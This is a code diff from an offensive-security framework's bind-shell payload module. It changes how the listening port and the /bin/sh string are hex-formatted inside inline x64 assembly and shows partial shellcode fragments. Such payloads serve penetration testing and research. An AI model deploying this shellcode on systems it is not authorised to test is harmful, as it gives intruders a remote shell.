@@ -23,8 +23,8 @@ class HatSploitPayload(Payload, Assembler, Socket):
     }
 
     def run(self):
-        bport = self.pack_port(self.handler['BPORT']).hex()
-        shell = b'//bin/sh'[::-1].hex()
+        bport = self.pack_port(self.handler['BPORT'])
+        shell = b'//bin/sh'[::-1]
 
         return self.assemble(
             self.details['Architecture'],
@@ -47,7 +47,7 @@ class HatSploitPayload(Payload, Assembler, Socket):
                 mov rdi, rax
                 xor rsi, rsi
                 push rsi
-                mov esi, 0x{bport}0101
+                mov esi, 0x{bport.hex()}0101
                 sub esi, 1
                 push rsi
                 mov rsi, rsp
@@ -79,7 +79,7 @@ class HatSploitPayload(Payload, Assembler, Socket):
 
                 xor rsi, rsi
                 push rsi
-                mov rdi, 0x{shell}
+                mov rdi, 0x{shell.hex()}
                 push rdi
                 mov rdi, rsp
                 xor rdx, rdx
